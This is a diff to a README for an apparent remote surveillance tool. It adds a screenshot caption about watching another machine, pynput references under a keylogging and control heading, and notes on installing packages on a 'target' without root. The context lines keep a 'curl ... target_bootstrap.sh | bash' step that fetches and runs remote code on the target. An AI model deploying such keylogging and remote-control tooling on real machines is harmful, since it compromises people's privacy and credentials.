@@ -50,7 +50,8 @@ curl <server-url>:<server-port>/target_bootstrap.sh | bash
 ```
 
 ## The Watcher in action
-
+The image below shows the screenreader able to watch the other machine running inside virtualbox.
+![screen_reader](Screenshots/screen_reader.png)
 
 ## References
 ### Screenshot
@@ -63,7 +64,10 @@ curl <server-url>:<server-port>/target_bootstrap.sh | bash
 ### Keylogging and controlling
 - [pynput docs](https://pynput.readthedocs.io/en/latest/)
 
-## Research required
+### Miscellaneous
+- https://docs.python.org/3/library/io.html
+
+## Research done
 - Install linux packages required by our target code on target system without root privileges.
     - Download the required packages using `apt download <package-name>`
     - extarct it using `dpkg -x <file-name>`
